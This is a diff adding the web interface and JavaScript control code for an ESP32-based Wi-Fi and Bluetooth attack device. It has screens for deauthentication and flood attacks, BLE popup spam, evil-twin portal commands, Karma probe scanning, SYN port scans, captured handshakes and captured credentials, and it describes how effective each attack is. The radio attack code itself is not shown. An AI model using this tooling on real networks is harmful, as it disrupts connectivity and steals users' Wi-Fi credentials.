+                    <button class="btn" onclick="startKarmaScan()" data-i18n="btn_scan_probes">SCAN PROBES</button>
+                    <button class="btn secondary" onclick="stopKarmaScan()" data-i18n="btn_stop_scan">STOP SCAN</button>
+                </div>
+            </div>
+
+            <div class="card flush">
+                <div class="card-head"><span class="grow" style="color:var(--accent);" data-i18n="detected_probes">DETECTED PROBES</span></div>
+                <div class="table-wrap">
+                    <table>
+                        <thead><tr>
+                            <th data-i18n="th_victim_mac">Victim MAC</th>
+                            <th data-i18n="th_target_ssid">Target SSID</th>
+                            <th data-i18n="th_rssi">RSSI</th>
+                            <th data-i18n="th_ch">CH</th>
+                            <th data-i18n="th_action">Action</th>
+                        </tr></thead>
+                        <tbody id="karma-scan-body"><tr class="empty"><td colspan="5" data-i18n="click_scan_probes">Click 'SCAN PROBES' to start listening...</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-deauth">
+            <h2 data-i18n="deauth_attack_title">Deauthentication Attack</h2>
+            <div class="card">
+                <label data-i18n="target_mode">TARGET MODE</label>
+                <select id="deauth-mode" onchange="updateDeauthUI()">
+                    <option value="single" data-i18n="opt_single_target">Single Target (Selected SSID)</option>
+                    <option value="broadcast" data-i18n="opt_all_networks">All Networks (Broadcast/Hopping)</option>
+                </select>
+                <div id="deauth-broadcast-channel-container" style="display:none;margin-top:12px;">
+                    <label style="margin-top:0;">ATTACK CHANNEL</label>
+                    <select id="deauth-broadcast-channel" onchange="updateDeauthUI()">
+                        <option value="0">All Channels (Hopping)</option>
+                    </select>
+                </div>
+
+                <div id="deauth-info-box" style="margin:14px 0;padding:12px;border-radius:var(--r-ctl);background:var(--red-soft);">
+                    <div class="section-label" style="color:var(--red);margin-bottom:4px;" data-i18n="current_target">CURRENT TARGET</div>
+                    <div id="deauth-target-ssid" style="font-size:15px;font-weight:650;color:var(--fg);overflow-wrap:anywhere;" data-i18n="no_target_selected">No Target Selected</div>
+                    <div id="deauth-target-bssid" class="mono" style="color:var(--muted);">--:--:--:--:--:--</div>
+                    <div style="font-size:11.5px;color:var(--muted);margin-top:4px;"><span data-i18n="lbl_channel">CHANNEL:</span> <span id="deauth-target-ch">--</span></div>
+                </div>
+
+                <label data-i18n="attack_type">ATTACK TYPE</label>
+                <select id="deauth-frame-type" onchange="updateAttackTypeDesc()">
+                    <option value="0" selected data-i18n="opt_deauth_frame">Deauthentication frame</option>
+                    <option value="1" data-i18n="opt_disassoc_frame">Disassociation frame</option>
+                    <option value="2" data-i18n="opt_broadcast_deauth">Broadcast deauth/disassoc</option>
+                    <option value="3" data-i18n="opt_auth_flood">Authentication flood</option>
+                    <option value="4" data-i18n="opt_assoc_flood">Association/Reassociation flood</option>
+                    <option value="5" data-i18n="opt_csa_spoof">CSA spoofing</option>
+                    <option value="6" data-i18n="opt_eapol_logoff">EAPOL-Logoff spoofing</option>
+                    <option value="7" data-i18n="opt_eapol_start">EAPOL-Start spam</option>
+                    <option value="8" data-i18n="opt_eap_fail">EAP Failure injection</option>
+                    <option value="9" data-i18n="opt_eap_id">EAP Identity request spam</option>
+                    <option value="10" data-i18n="opt_4way_disrupt">4-Way Handshake disruption</option>
+                    <option value="11" data-i18n="opt_wpa3_sae">WPA3 SAE flood</option>
+                    <option value="12" data-i18n="opt_pmf_downgrade">PMF/802.11w downgrade pressure</option>
+                    <option value="13" data-i18n="opt_nav_abuse">NAV/RTS/CTS abuse</option>
+                    <option value="14" data-i18n="opt_beacon_manip">Beacon manipulation</option>
+                </select>
+
+                <div id="attack-meta" style="margin-top:10px;"></div>
+                <div id="attack-desc" style="margin-top:8px;padding:10px;border-left:3px solid var(--accent);background:var(--card-2);border-radius:0 var(--r-ctl) var(--r-ctl) 0;color:var(--fg-2);font-size:12px;min-height:38px;"></div>
+
+                <p style="font-size:11.5px;color:var(--muted);margin:14px 0 0;">
+                    <strong style="color:var(--red);" data-i18n="warning">WARNING:</strong>
+                    <span id="deauth-warning-text" data-i18n="deauth_warning_text">This will disconnect clients from the selected Access Point.</span>
+                </p>
+
+                <div class="btn-group">
+                    <button class="btn danger" onclick="startDeauth()" data-i18n="btn_start_attack">START ATTACK</button>
+                    <button class="btn secondary" onclick="stopDeauth()" data-i18n="btn_stop">STOP</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-ble">
+            <h2 data-i18n="ble_sniffer_title">BLE Scanner &amp; Recon</h2>
+            <div class="card" style="margin-bottom:12px;">
+                <div class="section-label" data-i18n="display_filters">DISPLAY FILTERS</div>
+                <div class="grid auto">
+                    <input type="text" id="ble-filter-mac" placeholder="Filter MAC">
+                    <input type="text" id="ble-filter-name" placeholder="Filter Name / Vendor">
+                    <input type="number" id="ble-filter-rssi" placeholder="Min RSSI (-90)" value="-110">
+                </div>
+                <div class="btn-group">
+                    <button class="btn" onclick="startBleSniffer()" id="btn-ble-start"><span data-i18n="btn_start">START</span></button>
+                    <button class="btn danger" onclick="stopBleSniffer()" id="btn-ble-stop" disabled><span data-i18n="btn_stop">STOP</span></button>
+                    <button class="btn secondary" onclick="clearBleTable()" data-i18n="btn_clear">CLEAR</button>
+                </div>
+                <div style="margin-top:8px;font-size:11.5px;color:var(--muted);text-align:right;">
+                    <span>Devices:</span> <span id="ble-device-count" style="color:var(--accent);font-weight:600;">0</span>
+                </div>
+            </div>
+
+            <div class="card flush">
+                <div class="table-wrap" style="max-height:60vh;overflow-y:auto;">
+                    <table>
+                        <thead><tr>
+                            <th>MAC</th>
+                            <th>RSSI</th>
+                            <th>Identity</th>
+                            <th>Class</th>
+                            <th>Pkts</th>
+                            <th>Last</th>
+                            <th>Extra</th>
+                        </tr></thead>
+                        <tbody id="ble-body"><tr class="empty"><td colspan="7">Ready to scan BLE devices...</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-ble-spam">
+            <h2 data-i18n="ble_spam_title">BLE Spam Attack</h2>
+            <div class="card">
+                <p style="margin:0 0 12px;color:var(--muted);font-size:12px;" data-i18n="ble_spam_desc">Broadcast fake BLE advertisements to trigger persistent popups on nearby devices.</p>
+                <label data-i18n="target_device_ecosystem">TARGET ECOSYSTEM</label>
+                <select id="ble-spam-type">
+                    <option value="0">Apple (AirPods, Setup New Device)</option>
+                    <option value="1">Samsung (Galaxy Buds/Watch)</option>
+                    <option value="2">Google (Fast Pair)</option>
+                    <option value="3">Microsoft (Swift Pair)</option>
+                    <option value="4" selected>All Vendors (Randomize)</option>
+                </select>
+
+                <div style="margin-top:12px;padding:10px;border-left:3px solid var(--amber);background:var(--amber-soft);border-radius:0 var(--r-ctl) var(--r-ctl) 0;color:var(--fg-2);font-size:11.5px;">
+                    <strong style="color:var(--amber);">Note:</strong> iOS and Android may require the screen to be unlocked to display pairing popups.
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn danger" onclick="startBleSpam()" id="btn-ble-spam-start"><span data-i18n="btn_start_attack">START SPAM</span></button>
+                    <button class="btn secondary" onclick="stopBleSpam()" id="btn-ble-spam-stop" disabled><span data-i18n="btn_stop">STOP</span></button>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-sta">
+            <h2 data-i18n="sta_connection_title">Target Connection (STA)</h2>
+            <div class="card">
+                <p style="margin:0 0 12px;color:var(--muted);font-size:12px;">Connect the ESP32 to a target network to reach its internal subnet.</p>
+                <div class="row">
+                    <input type="text" id="sta-ssid" placeholder="Selected Target SSID" readonly style="flex:1 1 200px;">
+                    <input type="text" id="sta-password" placeholder="WiFi Password (if required)" style="flex:1 1 200px;">
+                </div>
+                <div class="btn-group">
+                    <button class="btn" onclick="connectSta()" data-i18n="btn_connect">CONNECT</button>
+                    <button class="btn secondary" onclick="disconnectSta()" data-i18n="btn_disconnect">DISCONNECT</button>
+                    <button class="btn ghost" onclick="getLastWifiCredential()" data-i18n="btn_get_last_target">GET LAST TARGET</button>
+                </div>
+
+                <dl class="kv" style="margin-top:16px;padding:12px;background:var(--card-2);border-radius:var(--r-ctl);">
+                    <dt>Connected</dt><dd id="sta-connected-ssid" style="font-weight:600;">NONE</dd>
+                    <dt>Status</dt><dd id="sta-status" style="color:var(--red);font-weight:600;">DISCONNECTED</dd>
+                    <dt>Local IP</dt><dd id="sta-ip" class="mono" style="color:var(--accent);">--.--.--.--</dd>
+                    <dt>Gateway</dt><dd id="sta-gw" class="mono">--.--.--.--</dd>
+                    <dt>Subnet</dt><dd id="sta-mask" class="mono">--.--.--.--</dd>
+                </dl>
+            </div>
+        </div>
+
+        <div class="view" id="view-host-discovery">
+            <h2 data-i18n="host_discovery_title">Subnet Scan</h2>
+            <div class="card" style="margin-bottom:12px;">
+                <p style="margin:0 0 12px;color:var(--muted);font-size:12px;">Map the internal network to find active devices, hostnames, and exposed services.</p>
+                <div class="grid auto" style="margin-bottom:12px;">
+                    <div class="kpi"><div class="num" id="hd-stat-hosts" style="color:var(--accent);">--</div><div class="cap">Hosts Found</div></div>
+                    <div class="kpi"><div class="num" id="hd-stat-services" style="color:var(--accent);">--</div><div class="cap">With Services</div></div>
+                    <div class="kpi"><div class="num" id="hd-stat-vendors" style="color:var(--accent);">--</div><div class="cap">Vendors</div></div>
+                    <div class="kpi"><div class="num" id="hd-stat-time" class="mono">--:--</div><div class="cap">Last Scan</div></div>
+                </div>
+                <div class="row" style="align-items:center;margin-bottom:12px;">
+                    <label class="check"><input type="checkbox" id="hd-include-mdns">mDNS</label>
+                    <label class="check"><input type="checkbox" id="hd-include-ssdp">SSDP/UPnP</label>
+                </div>
+                <div class="btn-group" style="margin-top:0;">
+                    <button class="btn" onclick="startHostScan()">START SWEEP</button>
+                    <button class="btn secondary" onclick="clearHostScan();">CLEAR</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:10px;flex-wrap:wrap;">
+                    <div class="section-label" style="margin:0;color:var(--accent);">DISCOVERED TARGETS</div>
+                    <input type="text" id="hd-filter" oninput="renderHostScanTable()" placeholder="Filter by IP, MAC, Hostname..." style="max-width:280px;flex:1 1 200px;height:30px;font-size:12px;">
+                </div>
+                <div style="border:1px solid var(--line);border-radius:var(--r-ctl);overflow:hidden;">
+                    <div id="host-scan-body"><div class="host-empty">Run a sweep to find targets</div></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-port-scan">
+            <h2 data-i18n="port_scanner_title">Port Scanner</h2>
+            <div class="card">
+                <div class="grid auto">
+                    <div><label style="margin-top:0;">TARGET IP</label><input type="text" id="ps-ip" placeholder="e.g. 192.168.1.5"></div>
+                    <div>
+                        <label style="margin-top:0;">SCAN METHOD</label>
+                        <select id="ps-method">
+                            <option value="1">SYN Scan (Stealth)</option>
+                            <option value="0">Connect Scan</option>
+                            <option value="2" disabled>FIN Scan (Not Implemented)</option>
+                            <option value="3" disabled>NULL Scan (Not Implemented)</option>
+                            <option value="4" disabled>XMAS Scan (Not Implemented)</option>
+                            <option value="5" disabled>ACK Scan (Not Implemented)</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label style="margin-top:0;">PORTS TARGET</label>
+                        <select id="ps-ports-preset" onchange="toggleCustomPorts()">
+                            <option value="top20">Top 20 Ports (Fast)</option>
+                            <option value="top100">Top 100 Ports</option>
+                            <option value="iot">IoT Default Ports</option>
+                            <option value="custom">Custom (Manual)</option>
+                        </select>
+                    </div>
+                    <div id="custom-ports-container" style="display:none;">
+                        <label style="margin-top:0;">CUSTOM PORTS</label>
+                        <input type="text" id="ps-custom-ports" placeholder="e.g. 80, 443, 8000-8080">
+                    </div>
+                </div>
+                <div class="btn-group">
+                    <button class="btn danger" onclick="startPortScan()" id="btn-ps-start">START SCAN</button>
+                    <button class="btn secondary" onclick="stopPortScan()" id="btn-ps-stop" disabled>STOP</button>
+                    <button class="btn ghost" onclick="document.getElementById('ps-terminal').replaceChildren(Object.assign(document.createElement('div'),{textContent:'Ready. Enter target and click START.',style:'color:var(--muted)'}))" data-i18n="btn_clear">CLEAR</button>
+                </div>
+                <div id="ps-terminal" style="margin-top:16px;min-height:150px;">
+                    <div style="color:var(--muted);">Ready. Enter target and click START.</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-handshakes">
+            <h2 data-i18n="captured_handshakes">Captured Handshakes</h2>
+            <div class="card flush">
+                <div class="card-head"><span class="grow" style="color:var(--accent);">LIST OF CAPTURED HANDSHAKES</span></div>
+                <div class="table-wrap">
+                    <table>
+                        <thead><tr>
+                            <th>Target SSID</th>
+                            <th>BSSID</th>
+                            <th>Channel</th>
+                            <th>Encryption</th>
+                            <th>Mode</th>
+                            <th data-i18n="th_action">Action</th>
+                        </tr></thead>
+                        <tbody id="handshakers-bank-body"><tr class="empty"><td colspan="6">No handshake captured.</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-passwords">
+            <h2 data-i18n="captured_creds_title">Captured Credentials</h2>
+            <div class="card">
+                <textarea id="passwords-textarea" readonly style="height:340px;"></textarea>
+                <div class="btn-group">
+                    <button class="btn" onclick="fetchPasswords()" data-i18n="btn_refresh">REFRESH</button>
+                    <button class="btn secondary" onclick="document.getElementById('passwords-textarea').value=''" data-i18n="btn_clear">CLEAR</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="view" id="view-settings">
+            <h2 data-i18n="configuration_title">Configuration</h2>
+            <div class="card">
+                <form id="hotspot-form" onsubmit="handleSettings(event)">
+                    <label data-i18n="mgmt_ap_ssid" style="margin-top:0;">Management AP SSID</label>
+                    <input type="text" id="ssid" name="ssid">
+                    <label data-i18n="password">Password</label>
+                    <input type="text" id="password" name="password">
+                    <label data-i18n="channel">Channel</label>
+                    <input type="number" id="channel" name="channel" min="1" max="13">
+                    <label data-i18n="tx_rate">TX Power Rate</label>
+                    <select id="tx_rate" name="tx_rate">
+                        <optgroup label="Max Range / Attack (802.11b)">
+                            <option value="0">1 Mbps (Long Preamble)</option>
+                            <option value="2">5.5 Mbps (Long Preamble)</option>
+                        </optgroup>
+                        <optgroup label="Balanced / Default (802.11g)">
+                            <option value="11">6 Mbps</option>
+                            <option value="15">9 Mbps (Default)</option>
+                            <option value="10">12 Mbps</option>
+                            <option value="9">24 Mbps</option>
+                        </optgroup>
+                        <optgroup label="High Speed (802.11g/n)">
+                            <option value="12">54 Mbps</option>
+                            <option value="16">MCS0 (6.5 Mbps / LGI)</option>
+                            <option value="23">MCS7 (65 Mbps / LGI)</option>
+                        </optgroup>
+                    </select>
+                    <div class="btn-group">
+                        <button type="submit" class="btn" data-i18n="btn_save_reboot">SAVE &amp; REBOOT</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="scrim" onclick="toggleSidebar()"></div>
+<div id="terminal" class="terminal-panel">
+    <div class="log-entry"><span class="log-time">[SYSTEM]</span> <span class="log-info" data-i18n="sys_ready">Ready.</span></div>
+</div>
+<div id="toast" class="toast">Notification Message</div>
+
+<script>
+/* ===== Reused from the audited build; unchanged command plumbing ===== */
+        // ==========================================
+        // CONFIGURAZIONE & COSTANTI
+        // ==========================================
+        const WS_URL = `ws://${window.location.host}/ws`;  // already authenticated: this page is only served after the PIN gate
+        
+        const CMD = {
+            GET_STATUS: 0,
+            SET_AP_SETTINGS: 1,
+            GET_AP_SETTINGS: 2,
+            WIFI_SCAN: 3,
+            START_EVILTWIN: 4,
+            STOP_EVILTWIN: 5,
+            GET_EVILTWIN_TARGET: 6,
+            CHECK_INPUT_PASSWORD: 7,
+            GET_PASSWORDS: 8,
+            KARMA_ATTACK_SCAN: 9,
+            GET_KARMA_PROBES: 10,
+            KARMA_ATTACK_START: 11,
+            START_DEAUTHER: 12,
+            STOP_DEAUTHER: 13,
+            START_RAW_SNIFFER: 14,
+            STOP_RAW_SNIFFER: 15,
+            GET_RECON_DATA_AP: 16,
+            GET_RECON_DATA_CLI: 17,
+            WIFI_CONNECT: 18,
+            WIFI_DISCONNECT: 19,
+            DOWNLOAD_HANDSHAKE: 20,
+            START_PACKET_ANALYZER: 21,
+            STOP_PACKET_ANALYZER: 22,
+            GET_LAST_WIFI_CREDENTIALS: 23,
+            HOST_DISCOVERY: 24,
+            PORT_SCAN_SINGLE: 25,
+            START_BLE_SNIFFER: 26,
+            STOP_BLE_SNIFFER: 27,
+            GET_BLE_DEVICES: 28,
+            BLE_DEVICES_CLEAR: 29,
+            START_BLE_SPAM: 30,
+            STOP_BLE_SPAM: 31,
+            SET_PORTAL_SCHEME: 33,
+            PORTAL_LOGIN: 34,
+            PORTAL_OTP: 35,
+            PORTAL_STATUS: 36,
+            PORTAL_SESSIONS: 37,
+            PORTAL_DECIDE: 38,
+            PORTAL_UA_MODE: 39,
+            PORTAL_UA_LOG: 40,
+            SAVE_TARGET: 41,
+            LIST_TARGETS: 42,
+            DELETE_TARGET: 43,
+            START_SAVED_ATTACK: 44,
+        };
+
+        // Stato globale
+        let ws = null;
+        let reqIdCounter = 0;
+        let pendingRequests = new Map();
+        let isConnected = false;
+        let statusInterval = null;
+        let reconPollingInterval = null;
+        let isReconRunning = false;
+        let currentTarget = null;
+        let karmaInterval = null;
+        let ssidFinderInterval = null;
+        let isSsidFinderRunning = false;
+
+        // Cache locale per i dati Recon
+        let lastApsData = [];
+        let lastClientsData = [];
+        let apMap = {}; // BSSID -> SSID
+
+        // Packet sniffer
+        let snifferActive = false;
+        let isSnifferPaused = false;
+        let totalPacketsRx = 0;
+        let displayedPackets = 0;
+        const SUBTYPES = {
+            1: [ // MANAGEMENT (Enum libwifi_mgmt_subtypes) -> val = enum << 4
+                { name: "All Management", val: 0xFFFF },
+                { name: "Assoc Req (0)", val: 0x00 },          // SUBTYPE_ASSOC_REQ
+                { name: "Assoc Resp (1)", val: 0x10 },         // SUBTYPE_ASSOC_RESP
+                { name: "Reassoc Req (2)", val: 0x20 },        // SUBTYPE_REASSOC_REQ
+                { name: "Reassoc Resp (3)", val: 0x30 },       // SUBTYPE_REASSOC_RESP
+                { name: "Probe Req (4)", val: 0x40 },          // SUBTYPE_PROBE_REQ
+                { name: "Probe Resp (5)", val: 0x50 },         // SUBTYPE_PROBE_RESP
+                { name: "Timing Adv (6)", val: 0x60 },         // SUBTYPE_TIME_ADV
+                { name: "Beacon (8)", val: 0x80 },             // SUBTYPE_BEACON
+                { name: "ATIM (9)", val: 0x90 },               // SUBTYPE_ATIM
+                { name: "Disassoc (10)", val: 0xA0 },          // SUBTYPE_DISASSOC
+                { name: "Auth (11)", val: 0xB0 },              // SUBTYPE_AUTH
+                { name: "Deauth (12)", val: 0xC0 },            // SUBTYPE_DEAUTH
+                { name: "Action (13)", val: 0xD0 },            // SUBTYPE_ACTION
+                { name: "Action No Ack (14)", val: 0xE0 }      // SUBTYPE_ACTION_NOACK
+            ],
+            2: [ // CONTROL (Mappatura su Filtri Hardware ESP32)
+                { name: "All Control", val: 0xFFFF },
+                { name: "RTS (11)", val: (1<<27) },            // SUBTYPE_RTS
+                { name: "CTS (12)", val: (1<<28) },            // SUBTYPE_CTS
+                { name: "ACK (13)", val: (1<<29) },            // SUBTYPE_ACK
+                { name: "Block Ack Req (8)", val: (1<<24) },   // SUBTYPE_BLOCK_ACK_REQ
+                { name: "Block Ack (9)", val: (1<<25) },       // SUBTYPE_BLOCK_ACK
+                { name: "PS-Poll (10)", val: (1<<26) },        // SUBTYPE_PS_POLL
+                { name: "CF-End (14)", val: (1<<30) },         // SUBTYPE_CF_END
+                { name: "CF-End+Ack (15)", val: (1<<31) },     // SUBTYPE_CF_END_CF_ACK
+                { name: "Wrapper (7)", val: (1<<23) }          // SUBTYPE_WRAPPER
+            ],
+            3: [ // DATA (Enum libwifi_data_subtypes) -> val = enum << 4
+                { name: "All Data", val: 0xFFFF },
+                { name: "Data (0)", val: 0x00 },               // SUBTYPE_DATA
+                { name: "Data Null (4)", val: 0x40 },          // SUBTYPE_DATA_NULL
+                { name: "QoS Data (8)", val: 0x80 },           // SUBTYPE_DATA_QOS_DATA
+                { name: "QoS Data CF-Ack (9)", val: 0x90 },    // SUBTYPE_DATA_QOS_DATA_CF_ACK
+                { name: "QoS Data CF-Poll (10)", val: 0xA0 },  // SUBTYPE_DATA_QOS_DATA_CF_POLL
+                { name: "QoS Data CF-Ack+Poll (11)", val: 0xB0 }, // SUBTYPE_DATA_QOS_DATA_CF_ACK_CF_POLL
+                { name: "QoS Null (12)", val: 0xC0 },          // SUBTYPE_DATA_QOS_NULL
+                { name: "QoS CF-Poll (14)", val: 0xE0 },       // SUBTYPE_DATA_QOS_CF_POLL
+                { name: "QoS CF-Ack+Poll (15)", val: 0xF0 }    // SUBTYPE_DATA_QOS_CF_ACK_CF_POLL
+            ]
+        };
+
+        const PORT_SERVICES = {
+            20: "ftp-data", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
+            53: "dns", 67: "dhcps", 68: "dhcpc", 69: "tftp", 80: "http",
+            110: "pop3", 111: "rpcbind", 119: "nntp", 123: "ntp", 135: "msrpc",
+            137: "netbios-ns", 138: "netbios-dgm", 139: "netbios-ssn", 143: "imap",
+            161: "snmp", 162: "snmptrap", 389: "ldap", 443: "https", 445: "microsoft-ds",
+            465: "smtps", 500: "isakmp", 514: "syslog", 515: "printer", 548: "afp",
+            587: "submission", 631: "ipp", 873: "rsync", 902: "vmware-auth", 990: "ftps",
+            993: "imaps", 995: "pop3s", 1080: "socks", 1194: "openvpn", 1433: "ms-sql-s",
+            1521: "oracle", 1723: "pptp", 1883: "mqtt", 1900: "upnp", 2049: "nfs",
+            2121: "ccproxy-ftp", 3128: "squid-http", 3306: "mysql", 3389: "ms-wbt-server",
+            3690: "svn", 3702: "ws-discovery", 4899: "radmin", 5060: "sip",
+            5432: "postgresql", 5683: "coap", 5900: "vnc", 5938: "teamviewer",
+            8000: "http-alt", 8080: "http-proxy", 8443: "https-alt", 8888: "sun-answerbook",
+            10000: "webmin", 32768: "filenet-tms", 37777: "dahua-dvr", 49152: "msrpc"
+        };
+
+        // ==========================================
+        // LOGGER & UI UTILS
+        // ==========================================
+        function log(msg, type = 'info') {
+            const term = document.getElementById('terminal');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            
+            // Mappa i livelli del C alle classi CSS
+            let colorClass = 'log-info';
+            if (type === 'error') colorClass = 'log-error';
+            else if (type === 'success') colorClass = 'log-success';
+            else if (type === 'warning') colorClass = 'log-warning';
+
+            const time = new Date().toLocaleTimeString().split(' ')[0];
+            const timeNode = document.createElement('span');
+            timeNode.className = 'log-time';
+            timeNode.textContent = `[${time}]`;
+            const messageNode = document.createElement('span');
+            messageNode.className = colorClass;
+            messageNode.textContent = msg == null ? '' : String(msg);
+            entry.append(timeNode, document.createTextNode(' '), messageNode);
+            
+            term.appendChild(entry);
+            if (term.scrollHeight - term.scrollTop <= term.clientHeight + 50) {
+                term.scrollTop = term.scrollHeight; 
+            }
+        }
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 3000);
+        }
+
+        function toggleSidebar() {
+            document.body.classList.toggle('drawer-open');
+        }
+
+        function showView(viewId, menuItem) {
+            try {
+                if (window.matchMedia('(max-width: 760px), (pointer: coarse) and (max-width: 1024px)').matches) {
+                    document.body.classList.remove('drawer-open');
+                }
+                document.querySelectorAll('.view').forEach(el => el.classList.remove('active'));
+                const targetView = document.getElementById(viewId);
+                if (targetView) targetView.classList.add('active');
+
+                document.querySelectorAll('button.nav-item').forEach(el => el.classList.remove('active'));
+                if (menuItem && menuItem.classList.contains('nav-item') && menuItem.tagName === 'BUTTON') menuItem.classList.add('active');
+                document.querySelectorAll('#mobile-nav button').forEach(el => {
+                    el.classList.toggle('active', el.dataset.view === viewId);
+                });
+
+                const activeItem = menuItem || document.querySelector('.nav-item[data-view="' + viewId + '"]');
+                const span = activeItem && activeItem.querySelector('span');
+                const titleEl = document.getElementById('page-title');
+                if (span && titleEl) titleEl.innerText = span.innerText;
+
+                if (viewId === 'view-settings') loadApSettings();
+                if (viewId === 'view-passwords') fetchPasswords();
+                if (viewId === 'view-deauth') updateDeauthUI();
+                if (viewId === 'view-eviltwin') { refreshPortalState(); startPortalSessionsPolling(); if (typeof refreshSavedTargets === 'function') refreshSavedTargets(); }
+                else { stopPortalSessionsPolling(); }
+                if (viewId === 'view-recon') {
+                    if (typeof fetchReconDataAp === 'function') fetchReconDataAp();
+                    if (typeof fetchReconDataCli === 'function') fetchReconDataCli();
+                }
+            } catch (err) {
+                console.error('showView error:', err);
+                document.body.classList.remove('drawer-open');
+            }
+            const viewEl = document.getElementById(viewId);
+            if (viewEl) viewEl.scrollTop = 0;
+        }
+
+        function updateAttackTypeDesc() {
+            const type = document.getElementById('deauth-frame-type').value;
+            const descEl = document.getElementById('attack-desc');
+            const metaEl = document.getElementById('attack-meta');
+
+            // Configurazione dati attacchi
+            const attackData = {
+                "0": { level: "LOW / MEDIUM", cls: "impact-medium", desc: "Sends <b>802.11 Deauthentication</b> frames. Effective on legacy networks. Completely blocked by WPA3/PMF." },
+                "1": { level: "LOW / MEDIUM", cls: "impact-medium", desc: "Sends <b>802.11 Disassociation</b> frames. Forces re-association. Blocked by PMF." },
+                "2": { level: "HIGH", cls: "impact-high", desc: "Uses <b>broadcast</b> deauth frames. Can disrupt entire non-PMF networks instantly. Extremely noisy." },
+                "3": { level: "MEDIUM", cls: "impact-medium", desc: "<b>Authentication flood</b>: Overwhelms AP state tables. Can freeze cheap routers, but modern APs limit this." },
+                "4": { level: "HIGH", cls: "impact-high", desc: "<b>Association flood</b>: Consumes AP memory/clients slots. effective DoS against consumer routers." },
+                "5": { level: "CRITICAL", cls: "impact-critical", desc: "<b>CSA Spoofing</b>: Forces clients to switch channel immediately. Causes instant drops even on some PMF networks." },
+                "6": { level: "LOW", cls: "impact-low", desc: "<b>EAPOL-Logoff</b>: Specific to WPA-Enterprise. Only works on implementations that don't validate frame state." },
+                "7": { level: "MEDIUM", cls: "impact-medium", desc: "<b>EAPOL-Start Spam</b>: Stresses the AP CPU by initiating many fake handshake sessions." },
+                "8": { level: "MEDIUM", cls: "impact-medium", desc: "<b>EAP Failure</b>: Can abort authentication process mid-way. Effective during connection phase." },
+                "9": { level: "LOW", cls: "impact-low", desc: "<b>EAP Identity Spam</b>: Minor annoyance, keeps client/AP busy answering identity requests." },
+                "10": { level: "LOW", cls: "impact-low", desc: "<b>Handshake Disruption</b>: Surgical denial of service. Prevents clients from completing the 4-Way Handshake." },
+                "11": { level: "LOW", cls: "impact-low", desc: "<b>WPA3 SAE Flood</b>: Cryptographic DoS. Exhausts AP CPU by forcing heavy math calculations. Deadly for WPA3 APs." },
+                "12": { level: "LOW", cls: "impact-low", desc: "<b>PMF Downgrade</b>: Attempts to force legacy mode. Low success rate on modern configured networks." },
+                "13": { level: "HIGH", cls: "impact-high", desc: "<b>NAV Abuse (Broadcast)</b>: Jams the network logically by reserving airtime (32ms). Virtual jamming." },
+                "14": { level: "CRITICAL / DEADLY", cls: "impact-critical", desc: "<b>Beacon Regulatory Abuse</b>: Exploits 802.11h/Compliance. Forces clients to drop power or switch channel. <br><b>Bypasses PMF. Highly Effective.</b>" }
+            };
+
+            const data = attackData[type] || { level: "UNKNOWN", cls: "impact-low", desc: "Select an attack." };
+
+            // data.cls/level/desc come only from the static attackData table above.
+            const impactBadge = document.createElement('span');
+            impactBadge.className = `impact-badge ${data.cls}`;
+            impactBadge.textContent = `EFFECTIVENESS: ${data.level}`;
+            metaEl.replaceChildren(impactBadge);
+            descEl.innerHTML = data.desc;
+            
+            const borderColors = {
+                "impact-low": "#adb5bd",
+                "impact-medium": "#ffab40",
+                "impact-high": "#ff5252",
+                "impact-critical": "#ff0000"
+            };
+            descEl.style.borderLeftColor = borderColors[data.cls];
+        }
+        
+        function formatBigNumber(num) {
+            if (num >= 1000000) return (num / 1000000).toFixed(2) + 'M';
+            if (num >= 1000) return (num / 1000).toFixed(1) + 'k';
+            return num.toString();
+        }
+        
+        //Sniffer Functions
+        function handlePacket(pkt) {
+            if(!document.getElementById('view-sniffer').classList.contains('active')) return;
+
+            totalPacketsRx++;
+            
+            if (isSnifferPaused) {
+                updateCounters();
+                return;
+            }
+
+            const minRssi = parseInt(document.getElementById('disp-filter-rssi').value) || -100;
+            if(pkt.rssi < minRssi) { updateCounters(); return; }
+
+            const fSrc = document.getElementById('disp-filter-src').value.trim().toUpperCase();
+            if(fSrc && !pkt.src.includes(fSrc)) { updateCounters(); return; }
+
+            const fDst = document.getElementById('disp-filter-dst').value.trim().toUpperCase();
+            if(fDst && !pkt.dst.includes(fDst)) { updateCounters(); return; }
+
+            const fSsid = document.getElementById('disp-filter-ssid').value.trim().toUpperCase();
+            if(fSsid && !pkt.info.toUpperCase().includes(fSsid)) { updateCounters(); return; }
+
+            displayedPackets++;
+            const tbody = document.getElementById('sniffer-body');
+            const row = document.createElement('tr');
+            
+            let color = "#bbb";
+            let bgColor = "transparent";
+            let fontWeight = "normal";
+            
+            if(pkt.type_str === "MGMT") {
+                if(pkt.subtype_str.includes("BEACON")) color = "#a380ff";
+                else if(pkt.subtype_str.includes("PROBE")) color = "#ff80ea";
+                else color = "#e0c0ff";
+            }
+            else if(pkt.type_str === "DATA") { color = "#80b3ff"; }
+            else if(pkt.type_str === "EAPOL") {
+                color = "#ffd700"; bgColor = "rgba(255, 215, 0, 0.1)"; fontWeight = "bold";
+            }
+            else if(pkt.type_str === "CTRL") { color = "#888"; }
+
+            row.style.color = color;
+            row.style.backgroundColor = bgColor;
+            row.style.fontWeight = fontWeight;
+
+            let rssiColor = pkt.rssi > -60 ? "#0f0" : (pkt.rssi > -80 ? "#ff0" : "#f00");
